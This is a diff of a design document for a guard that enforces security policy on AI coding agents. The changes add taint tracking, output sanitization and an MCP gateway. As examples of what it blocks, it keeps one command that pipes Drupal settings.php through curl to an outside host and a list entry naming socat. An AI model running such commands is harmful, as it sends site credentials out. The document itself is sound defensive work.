@@ -4,8 +4,8 @@
 **Target environment:** Windows + WSL2 + DDEV  
 **Target agents:** OpenAI Codex, Cursor, OpenCode  
 **Runtime target:** Packaged native Rust executable; zero developer-machine runtime dependencies  
-**Document version:** 0.2  
-**Last updated:** 2026-10-03
+**Document version:** 0.3
+**Last updated:** 2026-10-04
 
 ---
 
@@ -66,7 +66,10 @@ The core architectural principle is:
          Native response           Audit event
 ```
 
-The initial release should focus on **pre-execution enforcement**. Post-execution hooks and session taint tracking can be added as a second phase.
+The initial release focuses on **pre-execution enforcement**. Phase 14 adds
+session taint tracking and exfiltration controls; Phase 15 separately adds
+sensitive-output containment where a tested integration can intercept results
+before model-context ingestion.
 
 ## 2. Background and problem statement
 
@@ -1381,7 +1384,7 @@ socat
 
 MCP and native HTTP/browser tools must be treated separately by adapters because they may not appear as shell commands.
 
-### 21.1 Phase 1
+### 21.1 Stateless pre-tool enforcement
 
 Phase 1 blocks:
 
@@ -1397,23 +1400,250 @@ cat web/sites/default/settings.php | curl -X POST --data-binary @- https://examp
 
 would already fail due to the protected path, even before exfiltration analysis.
 
-### 21.2 Phase 2: taint tracking
+### 21.2 Model-context leakage threat
 
-A stronger version records session-level sensitivity state.
+A permitted operation can return credentials, secrets, PII, customer data,
+financial data, authentication material, or private content that must not enter
+model context. Representative cases include a `ddev drush sql:query` command,
+an MCP database query, shell environment output, logs containing Authorization
+headers, or an ordinary-looking query whose result contains an API credential.
 
-Example:
+Observing that result after it has already entered model context is useful for
+taint tracking, auditing, and later sink control, but it is not containment. A
+generic `PostToolUse` or result event provides no pre-context security property
+unless the tested host contract explicitly pauses delivery and permits the
+guard to replace or block the result.
+
+### 21.3 Shared sensitivity taxonomy
+
+The canonical categories are:
 
 ```text
-read sensitive database row
-        ↓
-session marked sensitive
-        ↓
-outbound network tool call
-        ↓
-deny or require explicit approval
+credential
+authentication
+personal_data
+financial_data
+customer_data
+private_content
+operational_sensitive
+unknown_sensitive
 ```
 
-This requires post-tool data or metadata and should be added only after stable pre-tool enforcement is deployed.
+The categories have these meanings:
+
+| Category | Meaning |
+|---|---|
+| `credential` | Passwords, private keys, API tokens, and equivalent secrets used to gain access. |
+| `authentication` | Sessions, cookies, authorization headers, hashes, and other authentication material. |
+| `personal_data` | Information relating to an identifiable person. |
+| `financial_data` | Payment, banking, transaction, or other protected financial information. |
+| `customer_data` | Customer/account records and business data entrusted to the project. |
+| `private_content` | Non-public content that is not more specifically classified. |
+| `operational_sensitive` | Internal logs, topology, configuration, or operational details whose disclosure creates risk. |
+| `unknown_sensitive` | A conservatively classified source whose precise sensitive class is not established. |
+
+One resource or session may carry multiple categories. Category merging is a
+deterministic union; no weaker or higher-level label removes a more restrictive
+one. The taxonomy is shared by filesystem and resource classification, SQL
+table/column classification, session taint state, Phase 15 scanners, sink
+policy, and auditing. These components must not introduce competing category
+vocabularies. Classifications contain identifiers and metadata, never the
+sensitive values themselves. Category is distinct from severity; policy maps a
+category and operation to block/approval behavior rather than relying on an
+implicit total category ordering.
+
+### 21.4 Phase 14: source, taint, and sink architecture
+
+Phase 14 records sensitivity obtained from known resources and uses it when
+evaluating later outbound operations:
+
+```text
+source
+  ↓
+sensitivity classification
+  ↓
+session taint
+  ↓
+sink evaluation
+```
+
+Statically known sources reuse existing path policy and SQL sensitive-table
+matching. For example, `users_field_data` may add `personal_data` and
+`credential`; Drupal settings or Composer authentication files may add
+`credential` and `authentication`. Project policy may add sources but cannot
+weaken mandatory classifications.
+
+Phase 15 may also provide dynamically detected sources. An ordinary tool result
+that triggers an API-token detector adds `credential` to the same Phase 14 state
+model. Sanitization or blocking does not automatically clear that taint because
+the underlying operation still accessed the protected information.
+
+Session state stores categories and bounded source metadata only. It never
+stores returned content, matched values, database rows, credentials, PII, or
+customer data. Its implementation must define identifier quality, user/session
+isolation, merge rules, expiry, cleanup, concurrency, reconnect/reuse behavior,
+and crash/restart semantics. When no stable session identity is available,
+policy must avoid cross-session contamination and conservatively limit any
+stateful claim.
+
+Sinks are operations capable of moving information outside the protected local
+context, including network-capable shell commands, remote Git/API operations,
+email or messaging tools, browser uploads, issue trackers, and outbound MCP
+capabilities. Source classification and sink classification are independent.
+Phase 14 remains useful on observe-only integrations because it can restrict a
+later pre-tool sink even when it could not contain the earlier result.
+
+### 21.5 Phase 15: pre-context containment boundary
+
+Raw output from policy-designated sensitive sources must not enter model context.
+Detected secrets and configured sensitive-data classes must be blocked or
+sanitized before model-context ingestion when the integration provides a safe
+interception path.
+
+The containing flow is:
+
+```text
+Agent
+  ↓
+pre-tool policy
+  ↓
+Tool
+  ↓
+RAW RESULT
+  ↓
+pre-context containment boundary
+  ↓
+ALLOW / SANITIZE / BLOCK
+  ↓
+SAFE RESULT
+  ↓
+Model
+```
+
+This flow is not containing:
+
+```text
+Tool
+→ Model
+→ PostToolUse observer
+```
+
+Only the first flow supports a pre-context non-disclosure claim. For protected
+operations, a path without a supported containment boundary must either fail
+closed before execution or be explicitly classified `observe_only`; it must not
+be advertised as output containment.
+
+### 21.6 Result decisions and sanitization
+
+Phase 15 introduces a result decision distinct from the pre-tool decision:
+
+```text
+ALLOW     forward raw output only when policy permits
+SANITIZE  forward only a transformed safe result
+BLOCK     discard raw output and return a safe synthetic result
+```
+
+Sanitization failure or scanner/parser failure on protected content becomes
+`BLOCK`. Original and sanitized results must never both be returned. Reasons,
+errors, and detector findings use rule IDs, categories, offsets, and bounded
+non-sensitive metadata; they never include the matched value or raw scanner
+input.
+
+Structured sanitizers should preserve useful shape where safe, including JSON
+validity, keys, column names, and UTF-8. They may redact values using stable
+category placeholders. Malformed, oversized, timed-out, or otherwise
+unscannable protected output fails closed.
+
+### 21.7 Agent/tool interception capabilities
+
+Each agent and tool category has one of these security capabilities:
+
+```text
+native_replace       host pauses result delivery and accepts a replacement
+guarded_execution    daguard executes and contains process output before release
+mcp_proxy            daguard mediates the request and upstream MCP response
+observe_only         guard sees metadata/result only after containment is impossible
+unsupported          no usable result integration exists
+```
+
+Capability is per agent *and* tool category, not merely per agent. Shell, file
+read, MCP, edit/patch, native, and custom/plugin tools may differ within one
+host. The capability record also identifies pre-call denial, input-rewrite and
+pre-context replacement support, guarded-execution support, security mode, and
+minimum tested version.
+
+Integration security capabilities must be tested and versioned rather than
+assumed from naming or generic hook availability. An upstream semantics change
+is security-critical. A supported safe path must never silently downgrade to
+`observe_only`, and no parity is claimed among Codex, Cursor, and OpenCode until
+each relevant agent/tool path has been verified.
+
+### 21.8 Guarded execution and MCP response gateway
+
+`daguard exec -- command args...` is the planned containment path for shell
+operations when the agent cannot replace native tool output. It directly spawns
+the process where possible and uses a shell only when the requested semantics
+require one. It privately captures stdout and stderr, retains raw bytes only
+ephemerally in memory, scans both streams before forwarding either, and creates
+no raw-output temporary files by default. The contract must define signal and
+exit-status behavior, timeouts, memory and output-size limits, and a streaming
+strategy that cannot release early chunks before a verdict. Failure to complete
+inspection for a protected operation blocks output.
+
+For MCP, the stronger design is a bidirectional gateway:
+
+```text
+agent
+→ daguard
+→ upstream MCP server
+→ daguard response scanner
+→ agent
+```
+
+The gateway applies pre-tool request policy, captures the upstream response,
+recursively scans supported textual/structured results, and returns only an
+allowed or sanitized response. Unsupported sensitive binary or attachment
+results are blocked. Because the gateway is on the response path before agent
+delivery, it can provide a boundary that an observe-only post hook cannot.
+
+### 21.9 Detection principles and limitations
+
+Secret detection is deterministic, bounded, and designed around safe regular
+expressions plus structured/context-aware checks. It covers recognizable key,
+token, authorization, credential-URL, assignment, session, and organization
+patterns without persisting matched values. Entropy analysis, if enabled, is
+conservative and contextual rather than a claim that any high-entropy string is
+a secret. Runtime, memory, input-size, multiline, and chunk-boundary behavior
+are explicit and tested.
+
+PII and other sensitive-data detection is confidence-oriented. Structured
+evidence such as a `mail` column plus a valid email-shaped value, a `pass`
+column, or a configured `billing_address` field is stronger than a loose match.
+Drupal-aware structure includes users/accounts, Webform submissions, Commerce
+orders/customers/profiles/payments, comments, and configured custom fields.
+Checksummed formats should be validated when possible. Generic scanning has
+both false positives and false negatives and cannot guarantee recognition of
+every unknown secret or form of personal data.
+
+### 21.10 Security guarantee and privacy boundary
+
+Raw output from policy-designated sensitive sources is prevented from entering
+model context when the integration provides a supported pre-context enforcement
+path. Detected secrets and configured sensitive-data classes are blocked or
+sanitized before model-context ingestion. Integrations without such a path
+either fail closed for protected operations or are explicitly classified as
+`observe_only` and are not advertised as providing output containment.
+
+This is not a claim that the model can never see sensitive data, nor that generic
+detection recognizes every secret or PII representation. The guarantee is
+limited to designated sources/classes, tested integration paths, configured
+policy, and the documented scanner bounds.
+
+The guard must not become a sensitive-data retention mechanism. Audit records
+may contain rule ID, sensitivity category, adapter/tool category, decision,
+result size, timestamp, and bounded non-sensitive identifiers. They must not
+contain raw results, matched credentials, matched PII, secret excerpts, scanner
+input, or values copied into error and tracing output.
 
 ---
 
@@ -2274,6 +2504,7 @@ The design primarily protects against:
 - prompt injection that causes an agent to request unsafe tools;
 - unsafe commands generated during debugging;
 - accidental exposure of secrets;
+- permitted tools returning sensitive output that must not enter model context;
 - inconsistent safety behavior between tools.
 
 It does not claim to protect against:
@@ -2298,6 +2529,8 @@ Protected assets include:
 
 ### 38.3 Trust boundaries
 
+The deployed v1 pre-tool boundary is:
+
 ```text
 Agent model
    |
@@ -2307,11 +2540,16 @@ Agent runtime
    |
    | proposed tool call
    v
-DAGUARD          <-- enforcement boundary
+DAGUARD          <-- pre-tool enforcement boundary
    |
    v
 WSL filesystem / DDEV / network
 ```
+
+Phase 15 adds a distinct pre-context boundary between raw tool results and the
+model, using only integration paths proven to stop and replace delivery. A
+post-tool observer downstream of the model is outside that boundary and cannot
+support a non-disclosure guarantee.
 
 The guard itself and organization policy are trusted components.
 
@@ -2388,9 +2626,19 @@ Enable:
 
 Move mandatory policy to organization-controlled paths and, where supported, configure agent-managed hooks so repository/user configuration cannot silently disable enforcement.
 
-### Phase 5 — taint tracking
+### Phase 5 — session taint and exfiltration controls (implementation Phase 14)
 
-Add post-tool/session state and exfiltration controls only after the stateless guard is stable.
+Add the shared sensitivity taxonomy, metadata-only source classification,
+session taint state, sink classification, and source-to-sink enforcement only
+after the stateless guard is stable. Post-tool observation can support these
+controls even when it cannot contain an already delivered result.
+
+### Phase 6 — sensitive-output containment (implementation Phase 15)
+
+Add tested pre-context interception, deterministic secret/sensitive-data
+scanning, and sanitize/block result decisions. Guarded execution and MCP
+gateway paths provide containment where native agent result replacement is not
+available. Keep pre-tool denials for unnecessary sensitive access.
 
 ---
 
@@ -2780,10 +3028,21 @@ The team should decide:
 
 ### Milestone 6 — advanced data protection
 
-- post-tool integration
+- post-tool/result event normalization
+- shared sensitivity taxonomy and source classification
 - session taint state
 - network/MCP sink controls
+- source-to-sink exfiltration enforcement
 - optional centralized audit export
+
+### Milestone 7 — sensitive-output containment
+
+- per-agent/tool interception capability matrix
+- pre-context result decisions
+- guarded shell execution
+- MCP response gateway
+- deterministic secret and sensitive-data scanning
+- structured sanitization and leakage testing
 
 ## 51. Acceptance criteria for v1
 
